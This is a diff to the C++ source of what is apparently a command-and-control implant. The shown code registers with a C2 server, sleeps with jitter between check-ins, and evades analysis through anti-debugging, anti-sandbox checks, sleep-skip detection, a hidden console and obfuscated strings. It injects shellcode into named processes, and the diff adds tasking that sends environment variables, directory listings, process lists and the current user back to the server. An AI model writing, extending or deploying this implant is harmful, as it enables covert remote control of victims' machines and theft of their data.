@@ -42,30 +42,31 @@ void LoopRegister(string privKey, string pubKey)
 		}
 
 		currentProfile = Register(toWide(C2_URL), pubKey, privKey);
-
 	}
 }
 
 int main()
 {
 
-	#ifndef DEBUG
-	 Sleep(INITIAL_SLEEP_SECONDS * 1000);
-	 FreeConsole();
-	 srand(time(NULL));
-	#endif
+	if (DEBUG == 0)
+	{
+		FreeConsole();
+		Sleep(INITIAL_SLEEP_SECONDS * 1000);
+	}
 
 	if (sodium_init() < 0)
 	{
 		return 1;
 	}
 
-	if (USE_ANTIDEBUG){
+	if (USE_ANTIDEBUG)
+	{
 		// Anti Debug
 		StartAntiDebugThread();
 	}
 
-	if (USE_ANTISANDBOX){
+	if (USE_ANTISANDBOX)
+	{
 		// Anti Sandbox
 		MemeIfSandboxed();
 	}
@@ -87,11 +88,15 @@ int main()
 		exit(1);
 	}
 
-	while (TRUE) {
+	while (TRUE)
+	{
 		int tries = 0;
+		DEBUG_PRINTF("Registering...\n");
+		DEBUG_PRINTF("URL: %s\n", C2_URL);
 		currentProfile = Register(toWide(C2_URL), pubKey, privKey);
 
-		if (DetectSleepSkip(1000)){
+		if (DetectSleepSkip(1000))
+		{
 			DEBUG_PRINTF("Sleep skipped, exiting\n");
 			exit(1);
 		}
@@ -99,16 +104,18 @@ int main()
 		if (currentProfile == NULL)
 		{
 			DEBUG_PRINTF("Error registering, aborting\n");
-			if (tries >= REGISTER_MAX_RETRIES){
+			if (tries >= REGISTER_MAX_RETRIES)
+			{
 				DEBUG_PRINTF("Max retries reached, exiting\n");
 				exit(1);
 			}
 			tries++;
-		} else {
+		}
+		else
+		{
 			break;
 		}
 	}
-	
 
 	// currentProfile = Register(toWide(C2_URL), pubKey, privKey);
 	// if (currentProfile == NULL)
@@ -117,22 +124,20 @@ int main()
 	// 	exit(1);
 	// }
 
-
 	DEBUG_PRINTF("Implant ID: %s\n", currentProfile->implantId.c_str());
-
 
 	// Checkin loop
 	while (TRUE)
 	{
-		#ifndef DEBUG
-			// Get random float between 0 and currentProfile->jitter
-			float maxJitter = currentProfile->jitter;
-			float jitter = (float)rand() / (float)RAND_MAX;
-			jitter = jitter * maxJitter;
-			float sleeptime = currentProfile->sleep + (currentProfile->sleep * jitter );
-		#else
-			float sleeptime = 5.f;
-		#endif
+#ifndef DEBUG
+		// Get random float between 0 and currentProfile->jitter
+		float maxJitter = currentProfile->jitter;
+		float jitter = (float)rand() / (float)RAND_MAX;
+		jitter = jitter * maxJitter;
+		float sleeptime = currentProfile->sleep + (currentProfile->sleep * jitter);
+#else
+		float sleeptime = 5.f;
+#endif
 		if (DetectSleepSkip(sleeptime * 1000))
 		{
 			DEBUG_PRINTF("Sleep skipped, exiting\n");
@@ -212,6 +217,52 @@ int main()
 			std::string shellcode = arr[0].GetString();
 			std::string processName = arr[1].GetString();
 			std::string result = Inject(shellcode, processName);
+			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), result, result != OBFUSCATED("ERROR"), currentProfile);
+		}
+		else if (opcode == OPCODE_CHDIR)
+		{
+			std::string dir = newTask->args->GetString();
+			BOOL result = ChangeDir(dir);
+			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), "", result != FALSE, currentProfile);
+		}
+		else if (opcode == OPCODE_PWD)
+		{
+			std::string result = GetDir();
+			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), result, result != OBFUSCATED("ERROR"), currentProfile);
+		}
+		else if (opcode == OPCODE_GETENV)
+		{
+			std::map<std::string, std::string> result = GetAllEnvVars();
+			std::string resultStr = "";
+			for (auto &var : result)
+			{
+				resultStr += var.first + "=" + var.second + "\n";
+			}
+			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), resultStr, resultStr != OBFUSCATED("ERROR"), currentProfile);
+		}
+		else if (opcode == OPCODE_LS)
+		{
+			std::vector<std::string> result = GetAllFilesInCurrentDirectory();
+			std::string resultStr = "";
+			for (auto &file : result)
+			{
+				resultStr += file + "\n";
+			}
+			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), resultStr, resultStr != OBFUSCATED("ERROR"), currentProfile);
+		}
+		else if (opcode == OPCODE_PS)
+		{
+			std::map<std::string, DWORD> pidMap = GetProcessNameToPIDMap();
+			std::string resultStr = "";
+			for (auto &pid : pidMap)
+			{
+				resultStr += pid.first + "=" + std::to_string(pid.second) + "\n";
+			}
+			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), resultStr, resultStr != OBFUSCATED("ERROR"), currentProfile);
+		}
+		else if (opcode == OPCODE_WHOAMI)
+		{
+			std::string result = Whoami();
 			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), result, result != OBFUSCATED("ERROR"), currentProfile);
 		}
 	}
